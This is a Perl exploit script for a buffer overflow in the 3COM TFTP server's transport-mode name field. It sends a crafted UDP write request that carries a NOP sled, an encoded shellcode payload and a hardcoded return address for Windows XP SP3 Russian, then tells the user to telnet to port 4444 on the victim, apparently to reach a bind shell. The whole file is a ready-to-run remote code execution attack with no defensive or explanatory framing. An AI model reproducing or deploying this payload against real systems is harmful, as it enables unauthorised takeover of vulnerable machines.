#!/usr/bin/perl -w

use IO::Socket;

if(!($ARGV[1]))
{
 print "\n3COM Tftp long transport name exploit\n";
 print "Use: exploit.pl <host> <port>\n\n";
 exit;
}

$target = IO::Socket::INET->new(Proto=>'udp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die "Cannot connect to $ARGV[0] on port $ARGV[1]";
 
my($shellcode)= 
"\xdb\xc6\xb8\x60\x77\x61\xc5\xd9\x74\x24\xf4\x5b\x29\xc9" .
"\xb1\x53\x31\x43\x17\x03\x43\x17\x83\xa3\x73\x83\x30\xdf" .
"\x94\xc1\xbb\x1f\x65\xa6\x32\xfa\x54\xe6\x21\x8f\xc7\xd6" .
"\x22\xdd\xeb\x9d\x67\xf5\x78\xd3\xaf\xfa\xc9\x5e\x96\x35" .
"\xc9\xf3\xea\x54\x49\x0e\x3f\xb6\x70\xc1\x32\xb7\xb5\x3c" .
"\xbe\xe5\x6e\x4a\x6d\x19\x1a\x06\xae\x92\x50\x86\xb6\x47" .
"\x20\xa9\x97\xd6\x3a\xf0\x37\xd9\xef\x88\x71\xc1\xec\xb5" .
"\xc8\x7a\xc6\x42\xcb\xaa\x16\xaa\x60\x93\x96\x59\x78\xd4" .
"\x11\x82\x0f\x2c\x62\x3f\x08\xeb\x18\x9b\x9d\xef\xbb\x68" .
"\x05\xcb\x3a\xbc\xd0\x98\x31\x09\x96\xc6\x55\x8c\x7b\x7d" .
"\x61\x05\x7a\x51\xe3\x5d\x59\x75\xaf\x06\xc0\x2c\x15\xe8" .
"\xfd\x2e\xf6\x55\x58\x25\x1b\x81\xd1\x64\x74\x66\xd8\x96" .
"\x84\xe0\x6b\xe5\xb6\xaf\xc7\x61\xfb\x38\xce\x76\xfc\x12" .
"\xb6\xe8\x03\x9d\xc7\x21\xc0\xc9\x97\x59\xe1\x71\x7c\x99" .
"\x0e\xa4\xe9\x91\xa9\x17\x0c\x5c\x09\xc8\x90\xce\xe2\x02" .
"\x1f\x31\x12\x2d\xf5\x5a\xbb\xd0\xf6\x75\x60\x5c\x10\x1f" .
"\x88\x08\x8a\xb7\x6a\x6f\x03\x20\x94\x45\x3b\xc6\xdd\x8f" .
"\xfc\xe9\xdd\x85\xaa\x7d\x56\xca\x6e\x9c\x69\xc7\xc6\xc9" .
"\xfe\x9d\x86\xb8\x9f\xa2\x82\x2a\x03\x30\x49\xaa\x4a\x29" .
"\xc6\xfd\x1b\x9f\x1f\x6b\xb6\x86\x89\x89\x4b\x5e\xf1\x09" .
"\x90\xa3\xfc\x90\x55\x9f\xda\x82\xa3\x20\x67\xf6\x7b\x77" .
"\x31\xa0\x3d\x21\xf3\x1a\x94\x9e\x5d\xca\x61\xed\x5d\x8c" .
"\x6d\x38\x28\x70\xdf\x95\x6d\x8f\xd0\x71\x7a\xe8\x0c\xe2" .
"\x85\x23\x95\x12\xcc\x69\xbc\xba\x89\xf8\xfc\xa6\x29\xd7" .
"\xc3\xde\xa9\xdd\xbb\x24\xb1\x94\xbe\x61\x75\x45\xb3\xfa" .
"\x10\x69\x60\xfa\x30";



print "[*] Building Malicous Packet ...\n";

$nop="\x90" x 118;  
$jmp_2000 = "\x4e\xae\x3a\x7e";                             #JMP ESI User32.dll Windows XP SP3 Russian
$exploit = "\x00\x02";                                      #Write request (header)
$exploit=$exploit."A";                                      #File name   
$exploit=$exploit."\x00";                                   #Start of transporting name
$exploit=$exploit.$nop;                                     #Nop sled to land into shellcode 
$exploit=$exploit.$shellcode;                               #Our Hell code 
$exploit=$exploit.$jmp_2000;                                #Jump to shellcode 
$exploit=$exploit."\x00";                                   #End of TS mode name

print $target $exploit;
print "[*] Exploit packet sent ...\n";
print "[*] Done.\n";
print "[*] Telnet to 4444 on victim's machine.\n";

sleep(2);
close($target);
exit;